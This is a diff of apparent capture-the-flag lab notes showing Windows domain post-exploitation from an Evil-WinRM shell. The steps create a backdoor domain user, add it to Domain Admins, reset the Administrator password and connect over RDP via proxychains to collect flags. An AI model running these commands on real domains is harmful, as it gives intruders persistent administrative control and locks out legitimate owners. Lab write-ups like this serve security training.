@@ -25,3 +25,48 @@ Evil-WinRM PS C:\Users\Administrator\Documents> `hostname`
 
 ### Create a new user as an Administrator
 
+Evil-WinRM* PS C:\Users\Administrator\Documents> `net user kairos K41r@s123 /add /domain`
+
+Username: kairos
+Password:  K41r@s123
+
+### Enumerate the groups to find the group name for the Administrator user
+
+Evil-WinRM* PS C:\Users\Administrator\Documents> `net group`
+
+![[Dumping secrets from CORPDC-20240604135830320.webp]]
+
+### Add the new user to this group to make him the `Domain Admin`.
+
+Evil-WinRM* PS C:\Users\Administrator\Documents> `net group "Domain Admins" kairos /add /domain`
+
+### Display user's information
+
+
+The `net user` command is a Windows command-line utility that can be used to display or modify user account information. The `/domain` switch is used with `net user` to specify that the operation should be performed on a domain controller, allowing you to view or change user account information in a domain environment.
+
+Evil-WinRM* PS C:\Users\Administrator\Documents> `net user kairos /domain`
+
+![[Dumping secrets from CORPDC-20240604140856658.webp]]
+
+## Connect to RDP
+
+$ `proxychains4 -q xfreerdp /v:10.200.113.102 /u:kairos /p:K41r@s123` 
+
+### Getting flag 7
+[[Flag Submission Process]]
+
+
+## Change the Administrator's password.
+Even though you are a member of Domain Admins group, you can access the Administrator's directoroy.
+
+
+Evil-WinRM* PS C:\Users\Administrator\Documents> `net user Administrator Hacker@123 /domain`
+
+#### Connect to RDP with the Administrator's credentials
+
+$ `proxychains4 -q xfreerdp /v:10.200.113.102 /u:Administrator /p:Hacker@123 
+
+### Getting flag 8
+
+[[Flag Submission Process]]
